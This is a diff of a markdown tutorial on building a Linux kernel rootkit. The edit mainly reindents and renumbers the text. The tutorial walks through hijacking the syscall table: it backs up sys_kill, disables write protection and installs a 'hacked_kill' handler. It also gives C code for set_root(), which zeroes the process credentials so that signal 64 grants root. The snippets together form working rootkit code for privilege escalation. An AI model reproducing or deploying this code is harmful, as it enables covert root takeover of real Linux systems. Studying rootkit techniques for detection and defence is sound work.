@@ -875,177 +875,176 @@ static inline void unprotect_memory(void)
 ```
 #### Step3: <ins>Performing the actual hooking</ins>.
 
-   According to this [blog](https://xcellerator.github.io/posts/linux_rootkits_02/#how-the-kernel-handles-syscalls):\
-      The arguments that we pass from usermode are stored in registers (if you have done some RE, you should have known that, right?), then this values are stored in a special struct called [pt_regs](https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12), which is then passed to the syscall, then syscall performs its work and go through the members of the passed stucture in which it is interested in. 
+According to this [blog](https://xcellerator.github.io/posts/linux_rootkits_02/#how-the-kernel-handles-syscalls):\
+The arguments that we pass from usermode are stored in registers (if you have done some RE, you should have known that, right?), then this values are stored in a special struct called [pt_regs](https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12), which is then passed to the syscall, then syscall performs its work and go through the members of the passed stucture in which it is interested in. 
 
-   So, => We gonna need pt_regs to do our shit!
+So, => We gonna need pt_regs to do our shit!
 
-   I actually intercepted two syscalls:\
-      1. **kill syscall**: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L708)
+I actually intercepted two syscalls:\
+a) **kill syscall**: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L708)
 
-   Took this from [xcellerator](https://xcellerator.github.io/posts/linux_rootkits_03/). In this blog, _"the ftrace helper method"_ is implemented, instead of that I will be using _"the syscall table hijacking method"_ to perform the same syscall interception. I just want you guys/gals to go through the aforementioned blog once (from [top](https://xcellerator.github.io/posts/linux_rootkits_03/) till [_Hooking Kill_](https://xcellerator.github.io/posts/linux_rootkits_03/#hooking-kill) portion) before going on with this blog. It will help you as I have took most of the `syscall interception` portion from that blog apart from _"the syscall table hijacking method"_.
+Took this from [xcellerator](https://xcellerator.github.io/posts/linux_rootkits_03/). In this blog, _"the ftrace helper method"_ is implemented, instead of that I will be using _"the syscall table hijacking method"_ to perform the same syscall interception. I just want you guys/gals to go through the aforementioned blog once (from [top](https://xcellerator.github.io/posts/linux_rootkits_03/) till [_Hooking Kill_](https://xcellerator.github.io/posts/linux_rootkits_03/#hooking-kill) portion) before going on with this blog. It will help you as I have took most of the `syscall interception` portion from that blog apart from _"the syscall table hijacking method"_.
 
-   Now, it's time to perform hooking.\
-          But, what is hooking exactly?\
-          Hooking, in terms of syscall, is to manipulate with the original syscall with our very own malicious syscall, sort of man-in-the-middle attack scenario.\
-          Remember, we made the syscall table [editable](https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#step2-disabling-the-wpwrite-protection-flag-in-the-control-register) 'cause we want to edit original syscall in `syscall table` with our very own mal. syscall./
-          > ***NOTE*** : In programming world, syscall is nothing but a function.
+Now, it's time to perform hooking.\
+But, what is hooking exactly?\
+Hooking, in terms of syscall, is to manipulate with the original syscall with our very own malicious syscall, sort of man-in-the-middle attack scenario.\
+Remember, we made the syscall table [editable](https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#step2-disabling-the-wpwrite-protection-flag-in-the-control-register) 'cause we want to edit original syscall in `syscall table` with our very own mal. syscall.\
+> ***NOTE*** : In programming world, syscall is nothing but a function.
 
-   As soon as we made the `sys_call_table` unprotected, we would edit that specific syscall in syscall table that we are interested in. We should make a ***note*** that as we are overwriting original syscall function with our very own mal. syscall function, the nature of the later must be identical to the prior, otherwise this technique ***wouldn't work***.
+As soon as we made the `sys_call_table` unprotected, we would edit that specific syscall in syscall table that we are interested in. We should make a ***note*** that as we are overwriting original syscall function with our very own mal. syscall function, the nature of the later must be identical to the prior, otherwise this technique ***wouldn't work***.
 
-   The name of kill syscall (or sys_kill) in sys_call_table is ***__NR_kill*** (offset designated for sys_kill), [source](https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L87).
+The name of kill syscall (or sys_kill) in sys_call_table is ***__NR_kill*** (offset designated for sys_kill), [source](https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L87).
 
-   1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L42)\
-              So, let's define a custom function type to store original syscall, i.e., ***__NR_kill***.
+i. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L42)\
+So, let's define a custom function type to store original syscall, i.e., ***__NR_kill***.
 ```c
-              typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
+typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
 ```
-   As I have told you earlier that struct ***pt_regs*** is the one which has CPU registers as members of it, which will store passed arguements from usermode, which will eventually be read by syscall, right?\
-          2. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L45)
-              Creating function to store original syscall, i.e., ***__NR_kill***.
+As I have told you earlier that struct ***pt_regs*** is the one which has CPU registers as members of it, which will store passed arguements from usermode, which will eventually be read by syscall, right?\
+ii. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L45)\
+Creating function to store original syscall, i.e., ***__NR_kill***.
 ```c
-             static tt_syscall orig_kill;
+static tt_syscall orig_kill;
 ```
-   3. Let's store the original syscall
+iii. Let's store the original syscall
 ```c
-             orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
+orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
 ```
-   As, ***__NR_kill*** is the name of kill syscall (or, sys_kill) in **syscall table** and the function type of orig_kill is _`tt_syscall`_.\
-          4. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/9134a4d04bf6c0d347a22503b203bab9098b8eea/kernel_src/reveng_rtkit.c#L311), ignore those lines with **__NR_getdents64** (line no.: 310 and 315). I will explain **__NR_getdents64** seperately after completing this section.
+As, ***__NR_kill*** is the name of kill syscall (or, sys_kill) in **syscall table** and the function type of orig_kill is _`tt_syscall`_.\
+d) Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/9134a4d04bf6c0d347a22503b203bab9098b8eea/kernel_src/reveng_rtkit.c#L311), ignore those lines with **__NR_getdents64** (line no.: 310 and 315). I will explain **__NR_getdents64** seperately after completing this section.
 
-   Now, we stored the original syscall, rather backuped the original syscall, as this would be used later to revert back to normal syscall workflow while rmmod'ing our LKM aka. rootkit (in this scenario).\
-             So lets unprotect the memory and edit the syscall table and then revert back the memory protection as it was.
+Now, we stored the original syscall, rather backuped the original syscall, as this would be used later to revert back to normal syscall workflow while rmmod'ing our LKM aka. rootkit (in this scenario).\
+So lets unprotect the memory and edit the syscall table and then revert back the memory protection as it was.
 ```c
-              orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
+orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
 
-              unprotect_memory();
+unprotect_memory();
 
-              __sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
+__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 
-              protect_memory();
+protect_memory();
 ```
-   You might be thinking, what the heck is hacked_kill?\
-              It is actually the function (mal. syscall) that we created, which I will introduce you in the next step.\
-            5. So, now what ?\
+You might be thinking, what the heck is hacked_kill?\
+It is actually the function (mal. syscall) that we created, which I will introduce you in the next step.\
+e) So, now what ?\
 Remember that? **providing rootshell** portion earlier in this blog (if not, please go and [visit](https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#part6-providing-rootshell-to-the-attacker), it's obvious to forget as this blog is pretty long, don't be harsh on yourself! :hugs:)\
-              We will be implementing that _getting rootshell_ mechanism via _kill syscall_.
+We will be implementing that _getting rootshell_ mechanism via _kill syscall_.
 ```c
-                  static void set_root(void)
-                  {
-                    /*
-                     * pwd: /lib/modules/5.11.0-49-generic/build/include/linux/cred.h
-                     * 
-                     * struct cred {
-                     *      ...
-                     *      kuid_t          uid;            // real UID of the task
-                     *      kgid_t          gid;            // real GID of the task 
-                     *      kuid_t          suid;           // saved UID of the task
-                     *      kgid_t          sgid;           // saved GID of the task
-                     *      kuid_t          euid;           // effective UID of the task
-                     *      kgid_t          egid;           // effective GID of the task
-                     *      kuid_t          fsuid;          // UID for VFS ops
-                     *      kgid_t          fsgid;          // GID for VFS ops
-                     *      ...
-                     * };
-                     * 
-                     * ...
-                     * extern struct cred *prepare_creds(void);     // returns current credentials of the process
-                     * ...
-                     * extern int commit_creds(struct cred *);      // For setting modified values of ids to cred structure
-                     */
+static void set_root(void)
+{
+	/*
+	 * pwd: /lib/modules/5.11.0-49-generic/build/include/linux/cred.h
+	 * 
+	 * struct cred {
+	 *      ...
+	 *      kuid_t          uid;            // real UID of the task
+	 *      kgid_t          gid;            // real GID of the task 
+	 *      kuid_t          suid;           // saved UID of the task
+	 *      kgid_t          sgid;           // saved GID of the task
+	 *      kuid_t          euid;           // effective UID of the task
+	 *      kgid_t          egid;           // effective GID of the task
+	 *      kuid_t          fsuid;          // UID for VFS ops
+	 *      kgid_t          fsgid;          // GID for VFS ops
+	 *      ...
+	 * };
+	 * 
+	 * ...
+	 * extern struct cred *prepare_creds(void);     // returns current credentials of the process
+	 * ...
+	 * extern int commit_creds(struct cred *);      // For setting modified values of ids to cred structure
+	 */
 
-                    struct cred *root = prepare_creds();
+	 struct cred *root = prepare_creds();
 
-                    if (root == NULL)
-                    {
-                         return;
-                    }
+	if (root == NULL)
+	{
+ 		return;
+	}
 
-                    // Updating ids to 0 i.e. root
-                    root->uid.val = root->gid.val = 0;
-                    root->euid.val = root->egid.val = 0;
-                    root->suid.val = root->sgid.val = 0;
-                    root->fsuid.val = root->fsgid.val = 0;
+	// Updating ids to 0 i.e. root
+	root->uid.val = root->gid.val = 0;
+	root->euid.val = root->egid.val = 0;
+	root->suid.val = root->sgid.val = 0;
+	root->fsuid.val = root->fsgid.val = 0;
 
-                    // Setting the updated value to cred structure
-                    commit_creds(root);
-                  }
+	// Setting the updated value to cred structure
+	commit_creds(root);
+}
 
 
-                  static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
-                  {
-                    int sig = (int) pt_regs->si;
+static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
+{
+	int sig = (int) pt_regs->si;
 
-                    switch (sig)
-                    {
-                      case GET_ROOT:
-                            printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\t-> Offering root shell!!");
-                            /*
-                                  In someway system() function alike kernel function present in linux kernel programming
-                                  is required. in order to execute bash/sh shell then grant root shell as fish shell (in my
-                                  case) was alloted a root shell, but bash/sh shell did the job.
-                            */
-                            set_root();
-                            break;
-                      default:
-                            return orig_kill(pt_regs);
-                    }
-                    return 0;
-                  }
+	switch (sig)
+	{
+	case GET_ROOT:
+    		printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\t-> Offering root shell!!");
+    		/*
+	  		In someway system() function alike kernel function present in linux kernel programming
+	  		is required. in order to execute bash/sh shell then grant root shell as fish shell (in my
+	  		case) was alloted a root shell, but bash/sh shell did the job.
+    		*/
+    		set_root();
+    		break;
+	default:
+    		return orig_kill(pt_regs);
+	}
+	return 0;
+}
 ```
-   If you visit [<ins>Linux Syscall Reference</ins>](https://syscalls64.paolostivanin.com/), and search for _sys_kill_ you can see that it depends on 3 registers, **rax** (which contains the syscall id), **rdi** (which contians the file descriptor) and **rsi** (which is the location, where the passed arguments is to be stored). 
+If you visit [<ins>Linux Syscall Reference</ins>](https://syscalls64.paolostivanin.com/), and search for _sys_kill_ you can see that it depends on 3 registers, **rax** (which contains the syscall id), **rdi** (which contians the file descriptor) and **rsi** (which is the location, where the passed arguments is to be stored). 
                   
-   So here, we are only concerned about **rsi** register as we are interested in the arguments that are passed. We can see that we indeed need `int sig` to be placed in ***si*** register.
+So here, we are only concerned about **rsi** register as we are interested in the arguments that are passed. We can see that we indeed need `int sig` to be placed in ***si*** register.
 
-   So, that means:
+So, that means:
 ```c
-                  #define GET_ROOT 64
+#define GET_ROOT 64
 
-                  static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
-                  {
-                    int sig = (int) pt_regs->si;
+static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
+{
+	int sig = (int) pt_regs->si;
 
-                    switch (sig)
-                    {
-                      case GET_ROOT:
-                            printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\t-> Offering root shell!!");
-                            /*
-                                  In someway system() function alike kernel function present in linux kernel programming
-                                  is required. in order to execute bash/sh shell then grant root shell as fish shell (in my
-                                  case) was alloted a root shell, but bash/sh shell did the job.
-                            */
-                            set_root();
-                            break;
-                      default:
-                            return orig_kill(pt_regs);
-                    }
-                    return 0;
-                  }
+	switch (sig)
+	{
+		case GET_ROOT:
+			printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\t-> Offering root shell!!");
+			/*
+				In someway system() function alike kernel function present in linux kernel programming
+				is required. in order to execute bash/sh shell then grant root shell as fish shell (in my
+				case) was alloted a root shell, but bash/sh shell did the job.
+			*/
+			set_root();
+			break;
+		default:
+			return orig_kill(pt_regs);
+	}
+	return 0;
+}
 ```
-   line2 :&nbsp; `int sig = (int) pt_regs->si` => Stores the passed argument, in this case it is: `64`, [source](https://xcellerator.github.io/posts/linux_rootkits_03/) (Only the 1st portion before _Hooking kill_).
+line2 :&nbsp; `int sig = (int) pt_regs->si` => Stores the passed argument, in this case it is: `64`, [source](https://xcellerator.github.io/posts/linux_rootkits_03/) (Only the 1st portion before _Hooking kill_).
 
-   Now, if the passed argument/ signal (or sig) is same as `GET_ROOT` (which is a macro defined) then we are gifted with a _rootshell_.
+Now, if the passed argument/ signal (or sig) is same as `GET_ROOT` (which is a macro defined) then we are gifted with a _rootshell_.
 
-   #### Now the question comes, "Why _`si`_ register, why not _`rsi`_ register?"
+#### Now the question comes, "Why _`si`_ register, why not _`rsi`_ register?"\
+***Ans***: Please follow the [commented lines](https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12).
 
-   ***Ans***: Please follow the [commented lines](https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12).
-
-   I have told you earlier that the function type of original syscall must be same as the created syscall.
+I have told you earlier that the function type of original syscall must be same as the created syscall.
 ```
-                  static unsigned long *__sys_call_table;
-                  
-                  typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
-                  static tt_syscall orig_kill;
-                  orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
+static unsigned long *__sys_call_table;
 
-                  and
+typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
+static tt_syscall orig_kill;
+orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
 
-                  static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
-                  __sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
+and
+
+static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
+__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 ```
-   If you compare all the lines, you will see each function types are satisfying other function types, i.e. there is no function type mismatch. Although, if it doesn't match, obviously compiler will through you an error. I just showed this portion to you, as I was dealing with this same problem while creating this project.
+If you compare all the lines, you will see each function types are satisfying other function types, i.e. there is no function type mismatch. Although, if it doesn't match, obviously compiler will through you an error. I just showed this portion to you, as I was dealing with this same problem while creating this project.
 
-   6. So, the whole code to get the rootshell via `sys_kill interception`:
+f) So, the whole code to get the rootshell via `sys_kill interception`:\
 ```c
                   // filename: Test_hook_kill.h
 
